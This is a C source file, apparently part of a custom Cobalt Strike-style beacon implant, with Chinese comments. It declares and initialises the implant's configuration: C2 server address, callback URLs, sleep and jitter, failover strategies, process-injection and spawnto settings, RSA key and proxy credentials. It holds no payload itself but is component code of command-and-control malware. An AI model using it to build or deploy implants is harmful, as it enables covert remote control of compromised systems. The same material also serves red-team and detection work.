#include "c2profile.h"
#include "c2buf.h"

int shark_paths_size = 3;
char* shark_path[] = {"/ptj","/j.ad","/ga.js"};

//8  8:   192.168.159.128
shark_string shark_serverip;
//101
shark_string shark_ServerGetUrl;
//2
shark_int shark_ServerPort;


//10 在sharkinit中初始化位随机path
shark_string shark_ServerPostUrl;
//3
shark_int shark_dwMilliseconds;
//5
shark_int shark_jitter;

//67 是模式id
//2表示rotate或failover
//如果是random则是1 随机模式
//如果是round-robin则是0 默认模式
shark_int shark_strategyID;
//69 和failover(错误切换)有关 纯failover模式 69等于0
//当是按照错误次数切换的时候69等于指定次数
shark_int shark_failover_Strategy_number;
//70也与failover有关当是按照时间切换的时候70等于指定的时间
shark_int shark_failover_Strategy_time;
//68 如果是rotate模式 跟切换时间有关
shark_int shark_rotate_Strategy_time;

//9
shark_string shark_lpszAgent;

//43 权限
shark_int shark_bofrwx;
//44
shark_int shark_userwx;
//30
shark_string shark_post_ex_spawnto_x64;
//29
shark_string shark_post_ex_spawnto_x86;
//45 .process-inject.min_alloc
shark_int shark_min_alloc;

//51
shark_string shark_process_inject_execute;
// 46  .process-inject.transform-x86   256 bytes
shark_string shark_process_inject_transform_x32;
// 47  .process-inject.transform-x64   256 bytes
shark_string shark_process_inject_transform_x64;
//41
shark_int shark_BeaconCode;
//40 stop_data
shark_int shark_kill_data;
//54
shark_string shark_httpHeaderHost;
//12
shark_string shark_http_get_client_config;
//26 get or post
shark_string shark_verb;
//11   .http-get.server.output
shark_string shark_server_output_config;
//13 .http-post.client
shark_string shark_http_post_client_config;
//27 verb 指向包含在请求中使用的 HTTP 谓词的 以 null 结尾的字符串的指针。 如果此参数为 NULL，则函数使用 GET 作为 HTTP 谓词。
shark_string shark_http_verb;
//28 分块标志
shark_int shark_shouldChunkPosts;

//DNS 配置

//20 dns sleep  .dns-beacon.dns_sleep
shark_DWORD shark_dns_sleep;
//19 dns_idle   .dns-beacon.dns_idle
shark_DWORD shark_dns_idle;
//61 dns_get_A  .dns-beacon.get_A
shark_string shark_dns_get_A;
//62  dns_get_AAAA  .dns-beacon.get_AAAA
shark_string shark_dns_get_AAAA;
//63  dns_get_TXT .dns-beacon.get_TXT
shark_string shark_dns_get_TXT;
//66   dns监听器的配置选项dnsresolver
shark_string shark_dns_Listeneroptions_dnsresolver;


//35 判断是否需要设置http代理
shark_int shark_Proxyset;
//ProxyStrBuffer = get_str(32);
shark_string shark_ProxyStrBuffer;

//33  username_str proxy代理用户名
shark_string username_str;
//34  password_str proxy代理密码
shark_string password_str;

//59  header头
shark_string shark_lpszHeaders;
//1
shark_int shark_flaghttpopen;
//31
shark_WORD shark_CryptoScheme;
//7  获取RSA公钥
shark_string shark_rsa_publickey;



//58 57 为子beacon的header
shark_string shark_58tcp;
shark_string shark_57smb;

//39 BeaconCreateBackgroundThreads
shark_int shark_CreateBackgroundThreads;

//55
shark_int shark_exitflag;

//52
shark_int shark_virtualalloc;

//50
shark_int shark_usesCookieBeacon;
//42
shark_string shark_sleepsection;

//102 post url length
shark_int shark_posturllength;
//103 get url length
shark_int shark_geturllength;

int decryptInt(shark_int var1){
    if (var1.flag){
        return var1.value;
    }
    var1.flag++;
    //解密

    return var1.value;
}
unsigned char* decryptunsignedString(shark_unsignedstring var1){
    if (var1.flag){
        return var1.value;
    }
    var1.flag++;
    //解密

    return var1.value;
}
char* decryptString(shark_string var1){
    if (var1.flag){
        return var1.value;
    }
    var1.flag++;
    //解密

    return var1.value;
}
WORD decryptWORD(shark_WORD var1){
    if (var1.flag){
        return var1.value;
    }
    var1.flag++;
    //解密

    return var1.value;
}
DWORD decryptDWORD(shark_DWORD var1){
    if (var1.flag){
        return var1.value;
    }
    var1.flag++;
    //解密

    return var1.value;
}



void initGlobleVar(){


/*    const char *sep = ","; //可按多个字符来分割
    char* get_path = NULL;
    ip = strtok_s((char*)buf_8, sep, &get_path);*/

    shark_posturllength.value = buf_102;
    shark_geturllength.value = buf_103;

    shark_flaghttpopen.value = buf_1;
    shark_ServerPostUrl.value = (char*)buf_10;
    shark_serverip.value = (char*)buf_8;
    shark_ServerGetUrl.value = (char*)buf_101;

    shark_ServerPort.value = buf_2;
    shark_dwMilliseconds.value = buf_3;
    shark_jitter.value = buf_5;
    shark_strategyID.value = buf_67;
    shark_failover_Strategy_number.value = buf_69;
    shark_failover_Strategy_time.value = buf_70;
    shark_rotate_Strategy_time.value = buf_68;
    shark_lpszAgent.value = (char*)buf_9;
    shark_bofrwx.value = buf_43;
    shark_userwx.value = buf_44;
    shark_post_ex_spawnto_x64.value = (char*)buf_30;
    shark_post_ex_spawnto_x86.value = (char*)buf_29;
    shark_min_alloc.value = buf_45;
    shark_process_inject_execute.value = (char*)buf_51;
    shark_process_inject_transform_x64.value = (char*)buf_47;
    shark_process_inject_transform_x32.value = (char*)buf_46;
    shark_BeaconCode.value = buf_41;
    shark_kill_data.value = buf_40;
    shark_httpHeaderHost.value = (char*)buf_54;
    shark_http_get_client_config.value = (char*)buf_12;
    shark_verb.value = (char*)buf_26;  //26
    shark_server_output_config.value = (char*)buf_11;
    shark_http_post_client_config.value = (char*)buf_13;
    shark_http_verb.value = (char*)buf_27; //27
    shark_shouldChunkPosts.value = buf_28;
    shark_dns_sleep.value = 0;
    shark_dns_idle.value = 0;
    shark_dns_get_A.value = 0;
    shark_dns_get_AAAA.value = 0;
    shark_dns_get_TXT.value = 0;
    shark_dns_Listeneroptions_dnsresolver.value = 0;

    shark_Proxyset.value = buf_35;
    shark_ProxyStrBuffer.value = 0;
    username_str.value = 0;
    password_str.value = 0;
    shark_lpszHeaders.value = 0;
    shark_CryptoScheme.value = (WORD)buf_31;
    shark_rsa_publickey.value = buf_7;

    shark_CreateBackgroundThreads.value = buf_39;
    shark_exitflag.value = buf_55;

    shark_virtualalloc.value = buf_52;
    shark_usesCookieBeacon.value = buf_50;
    shark_sleepsection.value = {0};

    shark_58tcp.value = (char*)buf_58;
    shark_57smb.value = (char*)buf_57;

}
